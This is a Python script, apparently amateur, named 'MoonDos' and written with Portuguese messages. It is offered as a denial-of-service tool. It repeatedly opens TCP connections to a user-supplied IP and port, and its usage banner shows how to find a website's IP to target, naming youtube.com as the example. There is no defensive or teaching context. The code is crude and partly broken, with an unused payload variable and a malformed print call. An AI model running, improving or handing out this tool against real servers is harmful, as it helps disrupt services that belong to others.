import socket
import sys
import os
#By Koppy404; @koppyyy_

main = """

\n\n"""
count = 0

def init(ip, port, main):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.settimeout(0.03)
	code = client.connect_ex((ip, int(port)))
	if code == 0:
		print("[==>] - MoonDos atacando!.")
		print("IP: %s, PORT:%s", ip, port)
	else:
		print("Servidor Indisponivel ou Porta fechada!\n")


if len(sys.argv) < 4:
  print('\n\n')
  print('                  VERSÃO: V.1                   ')
  print('                  CODED BY KOPPY404                 ')
  print('                  Instagram: koppy999_                 ')
  print('\033[1;33m★ ★ ★ ★ ★ ★ ★  ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ ★ \033[m')
  print('\033[1;33m  ★ ★  ★  ★  ★ ★  ★  ★ ★ ★  ★  ★ ★ ★  ★  ★ ★ ★  ★  ★ ★ ★  ★  ★ ★ ★  ★  ★ ★ ★  ★  ★ ★ ★  ★  ★\033[m')
  print('\033[1;94m                             .-””””_\033[m')
  print('\033[1;94m                           F   .-"\033[m')
  print('\033[1;94m                          F   J\033[m')
  print('\033[1;94m                         I    I\033[m')
  print('\033[1;94m                          L   `.\033[m')
  print('\033[1;94m                           L    `-._.\033[m')
  print('\033[1;94m                            `-.__.-’\033[m')
  print('\033[1;31m       M O O N - D O S\033[m')
  print('              _____                    .----...__')
  print('          .--’     `-###          .--..-’         ””`---....')
  print(' _____.----.        `.._____ .’')
  print(' a:f                       /       -.')
  print('                         .(')
  print('                           : `--...')
  print('                            `.     ``.')
  print('                               :       :.')
  print('                             .’          )')
  print('                           .’            /')
  print('                        _.’              |   .##')
  print('                      ,:’               |     ’')
  print('                    ’                 <')
  print('                   ’                   |')
  print('                  /                    |')
  print('                 ’                     .')
  print('\033[1;30mModo de uso: python moondos.py 192.168.1.1 80 100\033[m')
  print('\033[1;30mDica: Descubra o ip do site usando o comando [ ping e o link do site sem https:// ]\033[m')
  print('\033[1;30mExemplo: ping youtube.com\033[m')
  print('\n\n')
  sys.exit(0)
else:
	ip = sys.argv[1]
	port = sys.argv[2]
	quantia = int(sys.argv[3])
	while count < quantia:
		count+=1
		init(ip, port, main)
	print("[!] Quantia enviada!  DoS Parado.")


